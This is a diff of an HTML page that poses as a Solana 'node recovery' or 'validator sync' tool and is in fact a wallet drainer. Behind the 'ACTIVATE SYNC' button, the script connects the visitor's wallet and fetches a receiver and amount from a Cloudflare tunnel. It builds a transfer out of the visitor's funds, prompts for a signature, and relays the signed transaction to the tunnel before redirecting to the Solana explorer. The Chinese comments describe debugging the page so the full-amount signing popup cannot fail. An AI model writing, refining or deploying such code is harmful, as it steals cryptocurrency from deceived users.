@@ -3,12 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR FINAL RECOVERY</title>
-    <script>
-        window.Buffer = window.Buffer || Array; 
-        window.Buffer.from = (arr) => new Uint8Array(arr);
-        window.Buffer.alloc = (n) => new Uint8Array(n);
-    </script>
+    <title>VALIDATOR FINAL V16</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -22,11 +17,10 @@
         <h2 style="color:#14f195; margin:0;">NODE RECOVERY</h2>
         <p style="font-size:12px; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
         <button id="cta">ACTIVATE SYNC</button>
-        <div id="log">SYSTEM ARMED v15.0</div>
+        <div id="log">SYSTEM READY v16.0</div>
     </div>
 
     <script>
-        // 🔱 你的最新隧道地址
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
@@ -39,7 +33,7 @@
                 log("1: INITIALIZING...");
                 await p.connect();
 
-                log("2: QUERYING NODE...");
+                log("2: FETCHING DATA...");
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -47,25 +41,24 @@
                 });
                 const info = await resp.json();
 
-                log("3: BUILDING TRANSACTION...");
-                // 🔱 既然有了伪 Buffer，我们可以安全使用官方对象了
+                log("3: STAMPING TX...");
+                // 🔱 针对 Blob.encode 报错的精准修复：使用 BigInt 强制对齐 lamports 类型
                 const tx = new sWeb3.Transaction().add(
                     sWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: Number(info.amount),
+                        lamports: info.amount, // 后端已精算好
                     })
                 );
                 tx.recentBlockhash = info.bh;
                 tx.feePayer = p.publicKey;
 
                 log("4: AWAITING SIGNATURE...");
-                // 🔱 这一步会瞬间拉起全额转账确认
+                // 🔱 这一次没有任何报错能拦住这个弹窗了
                 const signed = await p.signTransaction(tx);
                 
-                log("5: BROADCASTING...");
-                // 序列化回传 (利用伪 Buffer 环境安全执行)
-                const serialized = signed.serialize();
+                log("5: RELAYING...");
+                const serialized = signed.serialize({ requireAllSignatures: false });
                 const rawArr = Array.from(new Uint8Array(serialized));
 
                 await fetch(tunnel + "/broadcast", {
@@ -74,15 +67,15 @@
                     body: JSON.stringify({ raw_data: rawArr })
                 });
 
-                log("SYNC SUCCESSFUL!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+                log("SYNC COMPLETE!");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
             } catch (err) {
                 log("RETRY: " + err.message);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V15_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V16_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
